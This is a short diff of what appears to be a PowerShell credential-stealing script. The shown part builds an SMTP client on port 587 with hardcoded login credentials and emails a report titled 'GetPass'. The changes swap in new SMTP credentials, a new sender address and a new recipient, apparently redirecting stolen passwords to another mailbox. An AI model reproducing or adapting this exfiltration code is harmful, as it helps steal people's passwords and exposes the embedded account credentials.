@@ -8,13 +8,13 @@ $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 
 $SMTPInfo.EnableSsl = $true 
 
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('b54ababa9a8f80', 'e8ce20fc336bbc');
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('1de661e9bac019', '41e7b475aa6526');
 
 $ReportEmail = New-Object System.Net.Mail.MailMessage
 
-$ReportEmail.From = 'mother-of-dragons@houseoftargaryen.net'
+$ReportEmail.From = 'sami@wagor.tc.edu.tw'
 
-$ReportEmail.To.Add('jj55521932jj@gmail.com')
+$ReportEmail.To.Add('sami@wagor.tc.edu.tw')
 
 $ReportEmail.Subject = 'GetPass'
 
